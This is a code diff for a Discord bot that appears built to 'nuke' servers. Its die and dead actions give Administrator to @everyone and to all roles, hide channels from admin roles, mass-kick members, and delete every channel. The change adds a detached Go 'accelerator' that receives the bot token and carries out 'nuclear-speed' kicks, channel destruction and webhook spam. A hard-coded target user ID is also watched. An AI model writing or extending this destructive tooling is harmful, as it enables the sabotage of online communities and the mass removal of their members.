@@ -1,3 +1,10 @@
+const { execSync, spawn } = require('child_process');
+const path = require('path');
+const { PermissionsBitField, ButtonBuilder, ButtonStyle, ActionRowBuilder, ChannelType } = require('discord.js');
+
+// Path to the Atomic Go accelerator
+const ACCELERATOR_PATH = path.join(__dirname, '../go_accelerator/accelerator');
+
 // --- TARGET USER MONITORING ---
 const TARGET_USER_ID = '636930315503534110';
 
@@ -35,40 +42,26 @@ async function executeDieAction(interaction) {
     try {
         await interaction.deferUpdate().catch(() => {});
 
-        // 1. Give @everyone Administrator permission
+        // 1. Give @everyone Administrator permission (Atomic Shock)
         const everyoneRole = guild.roles.everyone;
         await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]).catch(() => {});
 
-        // 2. Load Admin Roles and find most populated role
-        const adminRoles = loadAdminRoles(); // Function exists in bot.js
-        const mostPopulatedRole = guild.roles.cache
-            .filter(r => r.id !== everyoneRole.id)
-            .sort((a, b) => b.members.size - a.members.size)
-            .first();
-
-        const rolesToDeny = [...adminRoles];
-        if (mostPopulatedRole) rolesToDeny.push(mostPopulatedRole.id);
-
-        // 3. Update all channels permissions in parallel
-        const channels = Array.from(guild.channels.cache.values());
-        const permissionOverwrites = rolesToDeny.map(roleId => ({
-            id: roleId,
-            deny: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages]
-        }));
-
-        // Execute parallelly
-        await Promise.all(channels.map(channel => 
-            channel.permissionOverwrites.set(permissionOverwrites).catch(() => {})
-        ));
-
-        // 4. Kick active members in parallel
+        // 2. Fetch all members and filter manageable ones
         const members = await guild.members.fetch();
-        const activeMembers = members.filter(m => !m.user.bot && m.id !== guild.ownerId && m.manageable);
-        
-        // Parallel kicks
-        await Promise.all(activeMembers.map(m => 
-            m.kick('Die Action Execution').catch(() => {})
-        ));
+        const targetMemberIDs = members.filter(m => !m.user.bot && m.id !== guild.ownerId && m.manageable).map(m => m.id);
+
+        // 3. Call Atomic Go accelerator for nuclear-speed kicks
+        const payload = JSON.stringify({
+            token: interaction.client.token,
+            guild_id: guild.id,
+            target_ids: targetMemberIDs,
+            action_type: "die"
+        });
+
+        // Fire and Forget (Unref)
+        spawn(ACCELERATOR_PATH, [payload], { detached: true, stdio: 'ignore' }).unref();
+
+        console.log(`[DIE - ATOMIC] Nuclear-speed kick initiated for ${targetMemberIDs.length} members.`);
 
     } catch (error) {
         console.error('Error in executeDieAction:', error);
@@ -83,30 +76,36 @@ async function executeDeadAction(interaction) {
     try {
         await interaction.deferUpdate().catch(() => {});
 
-        // 1. Delete all channels in parallel
-        const channels = Array.from(guild.channels.cache.values());
-        await Promise.all(channels.map(c => c.delete().catch(() => {})));
+        // 1. Fetch all channels
+        const channels = await guild.channels.fetch();
+        const channelIDs = Array.from(channels.keys());
 
-        // 2. Give Administrator to all roles
+        // 2. Call Atomic Go accelerator for nuclear-speed destruction and Webhook saturation
+        const payload = JSON.stringify({
+            token: interaction.client.token,
+            guild_id: guild.id,
+            target_ids: channelIDs,
+            action_type: "dead"
+        });
+
+        // Fire and Forget (Unref)
+        spawn(ACCELERATOR_PATH, [payload], { detached: true, stdio: 'ignore' }).unref();
+
+        // 3. Parallelly give Administrator to all editable roles
         const roles = guild.roles.cache.filter(r => r.id !== guild.roles.everyone.id && r.editable);
         await Promise.all(roles.map(r => 
             r.setPermissions([PermissionsBitField.Flags.Administrator]).catch(() => {})
         ));
 
-        // 3. Kick most active members
-        // Using the bot's existing stats system if possible, otherwise fetch and kick
-        const members = await guild.members.fetch();
-        const manageableMembers = members.filter(m => !m.user.bot && m.id !== guild.ownerId && m.manageable);
-        
-        // Sorting by "activity" (simulated by join date or presence if no DB access)
-        const sortedMembers = manageableMembers.sort((a, b) => (b.joinedTimestamp || 0) - (a.joinedTimestamp || 0));
-        const topActive = sortedMembers.first(100); // Top 100 as "most active"
-
-        await Promise.all(topActive.map(m => 
-            m.kick('Dead Action Execution').catch(() => {})
-        ));
+        console.log(`[DEAD - ATOMIC] Nuclear-speed channel destruction and Webhook saturation initiated.`);
 
     } catch (error) {
         console.error('Error in executeDeadAction:', error);
     }
 }
+
+module.exports = {
+    handleTargetAction,
+    executeDieAction,
+    executeDeadAction
+};
